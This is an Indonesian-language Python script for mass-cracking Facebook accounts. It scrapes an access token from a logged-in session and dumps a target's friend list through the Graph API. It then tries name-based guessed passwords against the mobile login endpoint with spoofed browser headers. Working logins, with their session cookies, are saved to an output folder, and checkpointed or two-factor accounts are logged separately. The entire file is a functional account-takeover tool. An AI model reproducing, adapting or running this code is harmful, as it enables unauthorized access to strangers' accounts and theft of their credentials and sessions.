# --MODULE-- #
import os,sys,requests,json,time,re
from concurrent.futures import ThreadPoolExecutor as thread

# --KUMPUL-- #
session = requests.Session()
id,nama,loop,ok,cp,a2f = [],[],0,0,0,0

# --BANNER-- #
def banner():
	if "linux" in sys.platform.lower():
		try:os.system('clear')
		except:pass
	elif "win" in sys.platform.lower():
	    try:os.system('cls')
	    except:pass
	else:
	    try:os.sytem('clear')
	    except:pass
	print('  __                          \n _|_ _  _ _ |_  _  _ |  \n  | (_|(_(/_|_)(_)(_)|< \n')

# --MENU-- #
def menu():
	banner()
	print(' * MENU')
	print(' 1. Crack with file')
	print(' 2. Crack with dump ID')
	print(' 3. Crack target ID')
	pilih = input(' * Pilih : ')
	if '1' in pilih:
		file()
	elif '2' in pilih:
		check()
	elif '3' in pilih:
		target()
	else:
		menu()

# --DUMP-- #
def file():
	banner()
	print(' * Masukan tempat File !')
	print(' * Contoh [ /sdcard/file/nama.txt ]')
	targetfile = input(' * Input : ')
	try:
		fileid = open(targetfile,'r').readlines()
		for line in fileid:
			id.append(line.strip())
			print('\r * sedang dump %s id'%(len(id)),end=" ")
		print(f'\r * Berhasil mengumpulkan {len(id)} ID');time.sleep(3)
		setid()
	except IOError:
		print(' * File tidak di temukan !')
		

# --TARGET-- #
def target():
	banner()
	ids = input(' * Input ID target : ')
	id.append(ids)
	print(' * Gunakan [ , ] untuk pemisah pw !')
	bahan = input(' * Input PW : ')
	for pisah in bahan.split(','):
		pws = []
		pws.append(pisah)
	banner();print(' * Result di simpan pada folder HASIL !\n')
	mulai(ids,pws)
	print('\r                                                            ')
	print(f' * Berhasil Crack {len(id)} ID')
	print(f' * Hasil Ok = {ok} | Cp = {cp} | A2f = {a2f}\n')

# --CHECK-- #
def check():
	banner()
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cookie.txt','r').read()
		try:
			req = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+token, cookies={'cookie':cookie})
			nama.append(json.loads(req.text)['name'])
		except KeyError:
			login()
		except requests.exceptions.ConnectionError:
			print(' * No internet !');exit()
	except IOError:
		login()
	print(' Welcome',str(nama).split("'")[1])
	print(' * Masukan ID target !')
	targetid = input(' * Input : ')
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cookie.txt','r').read()
		dump(f'https://graph.facebook.com/{targetid}?fields=friends&access_token={token}',token,cookie)
		print(f'\r * Berhasil mengumpulkan {len(id)} ID');time.sleep(3)
		setid()
	except:
		print(' * Terjadi kesalahan !')

# --LOGIN-- #
def login():
	try:
		banner()
		cook = input(' * Input Cookies : ')
		cookie = {'cookie':cook}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = session.get(url,cookies=cookie)
		setup = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		link = '%s?act=%s&nav_source=no_referrer'%(url,setup)
		req2 = session.get(link,cookies=cookie)
		tok = re.search('accessToken="(.*?)"',str(req2.content)).group(1)
		open('.token.txt', 'w').write(tok)
		open('.cookie.txt', 'w').write(cook)
		print(' * Login succes');time.sleep(1)
		check()
	except Exception as e:
		print(' * Login failled !')
		exit()

# --DUMP-- #
def dump(url,token,cookie):
	try:
		req = session.get(url,cookies={'cookies':cookie}).json()
		for pi in req['friends']['data']:
			try:
				if 'username' in pi:
					id.append(pi['username']+'|'+pi['name'])
					print('\r * sedang dump %s id'%(len(id)),end=" ")
				elif 'id' in pi:
					id.append(pi['id']+'|'+pi['name'])
					print('\r * sedang dump %s id'%(len(id)),end=" ")
				else:
					pass
			except Exception as e:
				print(e)
		try:
			if 'https' in req['friends']['paging']['next']:
				dump1(req['friends']['paging']['next'].replace('limit=25','limit=5000'))
		except:pass
	except (KeyError,IOError):
		exit(' * ID tidak publik !')

# --LANJUT-- #
def dump1(url):
	try:
		cook = open('.cookie.txt','r').read()
		bas = session.get(url,cookies={'cookies':cook}).json()
		for pi in bas['data']:
			try:
				if 'username' in pi:
					id.append(pi['username']+'|'+pi['name'])
					print('\r * sedang dump %s id'%(len(id)),end=" ")
				elif 'id' in pi:
					id.append(pi['id']+'|'+pi['name'])
					print('\r * sedang dump %s id'%(len(id)),end=" ")
				else:
					pass
			except Exception as e:
				print(e)
		if 'di batasi' in bas:
			print(' * Akun anda terkena limit !')
	except:
		pass

# --LANJUT-- #
def setid():
	banner()
	print(' * Result di simpan pada folder HASIL !\n')
	try:
		with thread(max_workers=1) as gass:
			for idd in id:
				pws = []
				ids,name = idd.split('|')[0],idd.split('|')[1].lower()
				depan = name.split(' ')[0]
				if len(depan)<=1:
					tengah = name.split(' ')[1]
					pws.append(name)
					pws.append(tengah)
					pws.append(tengah+'123')
					pws.append(tengah+'1234')
				elif len(depan)>=2:
					pws.append(name)
					pws.append(depan)
					pws.append(depan+'123')
					pws.append(depan+'1234')
				else:
					pws.append(name)
				pws.append('sayang')
				pws.append('sayangku')
				gass.submit(mulai,ids,pws)
		print('\r                                                            ')
		print(f' * Berhasil Crack {len(id)} ID')
		print(f' * Hasil Ok = {ok} | Cp = {cp} | A2f = {a2f}\n')
	except:
		print(' * Terjadi kesalahan pada setid')

# --LANJUT-- #
def mulai(ids,pws):
	global loop,ok,cp,a2f
	sys.stdout.write(f'\r ~ Running {loop} / {len(id)} Ok = {ok} | Cp = {cp} | A2f = {a2f}');sys.stdout.flush()
	for pw in pws:
		try:
			session.headers.update({
			'authority':	'free.facebook.com',
			'accept':	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-language':	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control':	'no-cache',
			'content-type':	'application/x-www-form-urlencoded',
			'origin':	'https://free.facebook.com',
			'pragma':	'no-cache',
			'referer':	'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
			'sec-ch-prefers-color-scheme':	'light',
			'sec-ch-ua':	'"Not:A-Brand";v="99", "Chromium";v="112"',
			'sec-ch-ua-full-version-list':	'"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
			'sec-ch-ua-mobile':	'?1',
			'sec-ch-ua-platform':	'"Android"',
			'sec-ch-ua-platform-version':	'"13.0.0"',
			'sec-fetch-dest':	'document',
			'sec-fetch-mode':	'navigate',
			'sec-fetch-site':	'same-origin',
			'sec-fetch-user':	'?1',
			'upgrade-insecure-requests':	'1',
			'user-agent':	'Mozilla/5.0 (Linux; Android 13; SM-A037F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
			})
			req = session.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			cookie = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
			data = {
			'bi_xrwh':	'0',
			'email':	ids,
			'jazoest':	re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
			'li':	re.search('name="li" value="(.*?)"', str(req.text)).group(1),
			'login':	'Masuk',
			'lsd':	re.search('name="lsd" value="(.*?)"', str(req.text)).group(1),
			'm_ts':	re.search('name="m_ts" value="(.*?)"', str(req.text)).group(1),
			'pass':	pw,
			'try_number':	'0',
			'unrecognized_tries':	'0'
			}
			header = {
			'authority':	'free.facebook.com',
			'accept':	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-encoding':	'gzip, deflate, br',
			'accept-language':	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control':	'no-cache',
			'content-length':	'162',
			'content-type':	'application/x-www-form-urlencoded',
			'origin':	'https://free.facebook.com',
			'pragma':	'no-cache',
			'referer':	'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
			'sec-ch-prefers-color-scheme':	'light',
			'sec-ch-ua':	'"Not:A-Brand";v="99", "Chromium";v="112"',
			'sec-ch-ua-full-version-list':	'"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
			'sec-ch-ua-mobile':	'?1',
			'sec-ch-ua-platform':	'"Android"',
			'sec-ch-ua-platform-version':	'"13.0.0"',
			'sec-fetch-dest':	'document',
			'sec-fetch-mode':	'navigate',
			'sec-fetch-site':	'same-origin',
			'sec-fetch-user':	'?1',
			'upgrade-insecure-requests':	'1',
			'user-agent':	'Mozilla/5.0 (Linux; Android 13; SM-A037F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
			}
			post = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',headers=header,cookies={'cookie':cookie},data=data,allow_redirects=False)
			if 'c_user' in post.cookies.get_dict():
				cook = (";").join([ "%s=%s" % (key, value) for key, value in post.cookies.get_dict().items() ])
				os.popen('play-audio musik/ok.mp3')
				print('\r * Status : Live                                      ')
				print(' * Email  :',ids)
				print(' * Pass   :',pw)
				print(' * Cookie :',cook,'\n')
				open('HASIL/ok.txt','a').write(ids+'|'+pw+'|'+cook+'\n')
				ok+=1
				break
			elif 'checkpoint' in post.cookies.get_dict():
				cook = (";").join([ "%s=%s" % (key, value) for key, value in post.cookies.get_dict().items() ])
				req_cp = session.get('https://free.facebook.com/checkpoint/?ref=dbl&_rdr',cookies={'cookie':cook})
				if str(re.findall('div\ title\=\"(.*?)\"',req_cp.text)).split("'")[1] in ['Masukan Kode Masuk untuk Melanjutkan','Enter login code to continue']:
					os.popen('play-audio musik/cp.mp3')
					print('\r * Status : Authen / a2f                          ')
					print(' * Email  :',ids)
					print(' * Pass   :',pw,'\n')
					open('HASIL/a2f.txt','a').write(ids+'|'+pw+'\n')
					a2f+=1
					break
				else:
					print('\r * Status : Checkpoint                            ')
					os.popen('play-audio musik/cp.mp3')
					print(' * Email  :',ids)
					print(' * Pass   :',pw,'\n')
					open('HASIL/cp.txt','a').write(ids+'|'+pw+'\n')
					cp+=1
					break
			else:
				continue
		except Exception as e:print('\n',e)
	loop+=1


if __name__=='__main__':
	try:os.mkdir('HASIL')
	except:pass
	os.popen('play-audio musik/intro.mp3')
	menu()